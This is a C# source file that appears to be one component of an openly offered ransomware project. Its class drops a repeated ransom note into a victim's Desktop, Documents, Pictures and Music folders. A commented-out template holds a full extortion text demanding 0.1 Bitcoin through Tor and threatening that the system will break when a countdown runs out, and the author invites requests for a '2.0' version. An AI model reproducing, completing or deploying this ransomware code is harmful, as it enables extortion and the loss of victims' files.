using System;
using System.IO;
namespace s0s_L_ckr
{

        internal class RansomMessage
        {
            private string Message { get; }
            private string FileName { get; }
            private int MessageCount { get; }

            public RansomMessage (string mess, string fileNam, int messCou)
            {
                /*mess = @"Ransom Note:
What Happened to my files?
All your files are encrypted and secured with a strong key. There is no way to get them back without your personal key.
 
How can I get my personal key?
Well, you need to pay for it. You need to visit one of the special sites below & then you need to enter your personal ID (you find it on the top) & buy it. Actually it costs exactly 0.1 Bitcoins.
 
How can I get access to the site?
You easily need to download the Torbrowser, you can get it from this site:
https://www.torproject.org
 
What is goin to happen if I'm not going to pay?
If you are not going to pay, then the countdown will easily ran out and then your system will be rboken. If you are going to restart, then the countdown will ran out a much faster. So, its not a good idea to do it.
 
I got the key, what should I do now?
Now you need to enter your personal key in the textbox below. Then you will get access to the decryption program.
 
- The darknet sites are not existing, its just an example text. The other things are right, except the darknet thing. Its possible to get the key, but if I going to do a new trojan, or new version of this then I will add real ways to get the key :) If you wanna that I going to do a 2.0 or a new trojan, then write it below in the comments. Thanks";
                */
                Message = mess;
                FileName = fileNam;
                MessageCount = messCou;
            }

            public void WritMesToDes()
            {
                var foldPath1 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                var foldPath2 = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                var foldPath3 = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
                var foldPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);

                WritMess(foldPath1, Message, MessageCount, FileName);
                WritMess(foldPath2, Message, MessageCount, FileName);
                WritMess(foldPath3, Message, MessageCount, FileName);
                WritMess(foldPath4, Message, MessageCount, FileName);



            }


            private void WritMess(string fPath, string msg, int msgCo, string fName)
            {
                StreamWriter sw;
                FileStream fs;
                for (int i = 0; i < msgCo; i++)
                {
                    var fN = $"{fName}0x{i}.txt";
                    var flP = Path.Combine(fPath, fN);

                using (fs = new FileStream(flP, FileMode.OpenOrCreate))
                    {
                        using (sw = new StreamWriter(fs))
                        {
                            sw.Write(msg);
                        }
                    }
                }
            }
        }
}
